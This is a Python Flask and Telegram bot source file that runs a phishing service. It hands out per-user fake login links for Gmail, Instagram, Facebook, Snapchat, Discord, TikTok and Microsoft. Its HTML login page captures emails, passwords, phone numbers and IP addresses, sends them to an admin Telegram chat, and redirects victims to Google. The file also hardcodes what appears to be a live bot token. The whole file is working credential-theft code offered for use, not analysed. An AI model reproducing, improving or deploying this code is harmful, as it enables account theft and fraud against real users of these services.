from flask import Flask, request, render_template_string
import os
import requests
import threading
import time
import json

app = Flask(__name__)

BOT_TOKEN = "8232409100:AAExUp0yXjQzN7js3bQriSKq5MiOClU3BeU"
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '6593129349')
PHISHING_DATA = []
STATS = {'visits': 0, 'captures': 0}
running = True
last_update_id = 0

def send_msg(chat_id, text, reply_markup=None):
    data = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}
    if reply_markup:
        data['reply_markup'] = json.dumps(reply_markup)
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=data, timeout=5)
    except: pass

def bot_loop():
    global last_update_id
    while running:
        try:
            resp = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", 
                              params={'offset': last_update_id + 1, 'timeout': 20}).json()
            if resp['ok']:
                for update in resp['result']:
                    last_update_id = update['update_id']
                    msg = update['message']
                    cid = msg['chat']['id']
                    txt = msg.get('text', '').lower().strip()
                    uid = msg['from']['id']
                    username = msg['from'].get('username', 'User')
                    
                    # GRAND WELCOME
                    if '/start' in txt:
                        markup = {
                            'inline_keyboard': [
                                [{'text': '📧 Gmail', 'callback_data': f'gmail_{uid}'}],
                                [{'text': '📸 Instagram', 'callback_data': f'insta_{uid}'}],
                                [{'text': '📘 Facebook', 'callback_data': f'facebook_{uid}'}],
                                [{'text': '👻 Snapchat', 'callback_data': f'snapchat_{uid}'}],
                                [{'text': '💬 Discord', 'callback_data': f'discord_{uid}'}],
                                [{'text': '🎵 TikTok', 'callback_data': f'tiktok_{uid}'}],
                                [{'text': '🔐 Microsoft', 'callback_data': f'microsoft_{uid}'}],
                                [{'text': '📊 Stats', 'callback_data': f'stats_{uid}'}]
                            ]
                        }
                        send_msg(cid, 
                                f"🎉 <b>WELCOME {username.upper()}!</b> 🎉\n\n"
                                f"🔥 <b>Ultimate Phishing Bot</b>\n"
                                f"🚀 Choose service below 👇\n\n"
                                f"💎 Premium links ready!\n"
                                f"📱 Perfect mobile UI\n"
                                f"🎣 Capture everything!", markup)
                        continue
                    
                    # CALLBACK HANDLER
                    if 'callback_query' in update:
                        query = update['callback_query']
                        cid = query['message']['chat']['id']
                        data = query['data']
                        uid = int(data.split('_')[1])
                        
                        if data.startswith('gmail_'):
                            url = f"https://myphish.onrender.com/phish/gmail/{uid}"
                            send_msg(cid, f"✅ <b>Gmail Phishing Link</b>\n\n<code>{url}</code>")
                        elif data.startswith('insta_'):
                            url = f"https://myphish.onrender.com/phish/instagram/{uid}"
                            send_msg(cid, f"✅ <b>Instagram Phishing Link</b>\n\n<code>{url}</code>")
                        elif data.startswith('facebook_'):
                            url = f"https://myphish.onrender.com/phish/facebook/{uid}"
                            send_msg(cid, f"✅ <b>Facebook Phishing Link</b>\n\n<code>{url}</code>")
                        elif data.startswith('snapchat_'):
                            url = f"https://myphish.onrender.com/phish/snapchat/{uid}"
                            send_msg(cid, f"✅ <b>Snapchat Phishing Link</b>\n\n<code>{url}</code>")
                        elif data.startswith('discord_'):
                            url = f"https://myphish.onrender.com/phish/discord/{uid}"
                            send_msg(cid, f"✅ <b>Discord Phishing Link</b>\n\n<code>{url}</code>")
                        elif data.startswith('tiktok_'):
                            url = f"https://myphish.onrender.com/phish/tiktok/{uid}"
                            send_msg(cid, f"✅ <b>TikTok Phishing Link</b>\n\n<code>{url}</code>")
                        elif data.startswith('microsoft_'):
                            url = f"https://myphish.onrender.com/phish/microsoft/{uid}"
                            send_msg(cid, f"✅ <b>Microsoft Phishing Link</b>\n\n<code>{url}</code>")
                        elif data.startswith('stats_'):
                            rate = STATS['captures']/max(STATS['visits'],1)*100
                            send_msg(cid, f"📊 <b>LIVE STATS</b>\n🎯 Captures: <code>{STATS['captures']}</code>\n👀 Visits: <code>{STATS['visits']}</code>\n✅ Success: <code>{rate:.1f}%</code>")
                    
                    # Admin commands
                    if str(cid) == ADMIN_CHAT_ID:
                        if txt == '/data':
                            if PHISHING_DATA:
                                recent = PHISHING_DATA[-10:]
                                data_text = "\n".join([f"🎣 <code>{d['email']}:{d['pass']}</code> [{d['service']}]" for d in recent])
                                send_msg(cid, f"💾 <b>RECENT CAPTURES:</b>\n\n{data_text}")
                            else:
                                send_msg(cid, "📭 No data yet!")
                        
        except: pass
        time.sleep(1)

@app.route('/')
def home():
    return f"<h1>🎣 ULTIMATE PHISH LIVE!</h1><h2>Visits: {STATS['visits']} | Hits: {STATS['captures']}</h2>"

@app.route('/phish/<service>/<int:user_id>')
def phish(service, user_id):
    STATS['visits'] += 1
    service_display = service.title()
    return render_template_string(LOGIN_TEMPLATE, service=service_display, user_id=user_id)

@app.route('/phish/<service>/<int:user_id>', methods=['POST'])
def capture(service, user_id):
    STATS['captures'] += 1
    data = {
        'email': request.form.get('email', ''),
        'pass': request.form.get('password', ''),
        'phone': request.form.get('phone', ''),
        'service': service.upper(),
        'ip': request.remote_addr
    }
    PHISHING_DATA.append(data)
    
    if ADMIN_CHAT_ID:
        send_msg(int(ADMIN_CHAT_ID), f"🎣 <b>{data['service']} HIT!</b>\n"
                                   f"📧 <code>{data['email']}</code>\n"
                                   f"🔑 <code>{data['pass']}</code>")
    
    return '''
    <script>
    alert("✅ Login Successful! Redirecting...");
    window.location.href = "https://www.google.com";
    </script>
    '''

LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html><head><title>{{service}} Login</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{margin:0;padding:40px 20px;background:linear-gradient(135deg,#667eea,#764ba2);font-family:system-ui,min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#fff;border-radius:24px;box-shadow:0 25px 50px rgba(0,0,0,0.25);padding:40px;max-width:400px;width:100%;text-align:center}
h1{color:#333;margin:0 0 15px;font-size:28px;font-weight:700}
.tag{color:#666;margin:0 0 35px;font-size:16px}
input{width:100%;padding:18px 20px;margin-bottom:20px;border:2px solid #e8ecf4;border-radius:16px;box-sizing:border-box;font-size:16px;transition:all .3s}
input:focus{outline:none;border-color:#667eea;transform:translateY(-2px)}
.btn{width:100%;padding:18px;background:linear-gradient(45deg,#667eea,#764ba2);color:#fff;border:none;border-radius:16px;font-size:18px;font-weight:600;cursor:pointer;transition:all .3s}
.btn:hover{transform:translateY(-3px);box-shadow:0 10px 25px rgba(102,126,234,0.4)}
.footer{margin-top:30px;color:#999;font-size:14px}
</style></head>
<body>
<div class="card">
<h1>🔐 {{service}}</h1>
<p class="tag">Secure login required</p>
<form method="POST">
<input name="email" type="email" placeholder="Email / Username" required>
<input name="password" type="password" placeholder="Password" required>
<input name="phone" type="tel" placeholder="Phone (optional)">
<input name="user_id" type="hidden" value="{{user_id}}">
<input name="service" type="hidden" value="{{service}}">
<button class="btn" type="submit">🚀 Continue</button>
</form>
<div class="footer">Protected by security</div>
</div>
</body></html>
'''

if __name__ == '__main__':
    threading.Thread(target=bot_loop, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
